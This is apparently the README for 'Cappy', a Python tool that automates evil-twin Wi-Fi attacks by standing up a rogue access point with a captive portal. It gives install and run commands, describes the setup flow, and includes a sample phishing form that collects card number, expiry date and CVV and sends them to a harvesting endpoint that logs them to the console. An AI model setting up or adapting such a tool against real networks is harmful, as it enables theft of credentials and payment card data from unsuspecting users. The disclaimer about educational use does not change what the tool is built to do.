**Evil Twin** is a phishing technique categorized under network attacks, it involves the creation of a **rogue wireless access point (AP)** that masquerades as a legitimate network, such as a public Wi-Fi hotspot or a familiar network with a captive portal, to deceive users into connecting and unknowingly divulging their sensitive login credentials and other personal information transmitted over the compromised connection.

> [!TIP]
> <strong>Cappy, a framework that automates the attack, must be used only in clear, educational purposes. Any action outside of that context is highly unrecommended, and may result in legal consequences</strong>

# Introduction

**Python** tool, that automates the process of setting up captive portal on Linux machines, with some tweaks.

> [!NOTE]
> This software was tested on: <strong>Kali Linux, KaliPi, ParrotOS</strong>
> In case of any trouble, create an issue and describe the error

**Cappy** works like this:

```
  Check Dependencies ---> Choose network interface
          |                         |                                                                         
          | missing?                â”” Change mac address                      Run captive portal <--- Select Template
          |                                   |                                       |                       |
  Install Dependencies                        â”” Menu Screen                           â”” Capture credentials   |
                                                     | start?                                                 |
                                                     â”” Prepare adapter ---> Configure IP Adresses ---> Restart services

```

# Setup

**In most cases, Cappy can handle the setup by itself, so give it a try**

1-A. Installing Cappy with pip

  <sub>This will make 'Cappy' available from any path in the terminal</sub>
  
  ```
    $ git clone https://github.com/FLOCK4H/Cappy
    $ cd Cappy
    $ sudo pip install .
  ```

1-B. Running Cappy with Python
   
   <sub>We will need to install dependencies manually</sub>

```
  $ sudo apt-get update
  $ sudo apt-get install lighttpd hostapd dnsmasq
  $ cd Cappy
  $ sudo python Cappy
```

# Usage

**Templates** are being saved to the <i> **/usr/local/share/Cappy/templates** </i>folder.

Creating a new template will result in making new directory in that path with a name of the template.

By default, there are 2 endpoints and 5 fields, that we can use in `index.html` of the template:
- /action.html -> username, password, credit, expire, cvv
- /data -> any

Example:
```
<form method='POST' action="http://10.0.0.15:80/action.html">
    <input type='text' name='credit' placeholder="CARD NUMBER"/>
    <input type='password' name='expire' placeholder="EXPIRY DATE"/>
    <input type='password' name='cvv' placeholder="CVV"/>
    <input value='Submit' type='submit'/>
</form>
```

**Device wanting to join the network will be redirected to the `index.html` of the template, where after entering credentials and submitting, will be redirected to the `action.html`, that harvests those credentials and logs to the console.**
